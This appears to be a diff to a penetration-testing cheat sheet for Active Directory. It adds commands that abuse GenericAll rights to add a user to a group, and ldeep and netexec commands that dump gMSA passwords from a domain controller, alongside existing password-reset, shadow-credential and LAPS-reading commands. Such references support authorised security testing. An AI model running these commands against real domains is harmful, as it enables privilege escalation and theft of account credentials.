@@ -115,6 +115,14 @@ rpcclient $> setuserinfo2 targetUser 23 newPassUser
 certipy shadow auto -u username@domain.com -p 'password' -account 'computer$'
 ```
 
+### GenericAll on Group
+
+> Can add user to group
+
+```bash
+net rpc group addmem "Group" "UsertoAdd" -U domain.com/User%'password' -S <DC IP>
+```
+
 ## GPO Abuse
 
 > pyGPOAbuse is changing the GPO without going back ! `Do not use in production` or at your own risk and do not forget to cleanup after
@@ -137,7 +145,9 @@ crackmapexec ldap dcIP -d domain.com -u user -p password -M laps
 ## Read GMSA Password
 
 ```bash
+ldeep ldap -s ldap://<DC IP>  -u user -p password -d domain.com gmsa 
 gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
+netexec ldap <DC IP> -u user -p password -d domain.com --gmsa
 ```
 
 ## DCSync
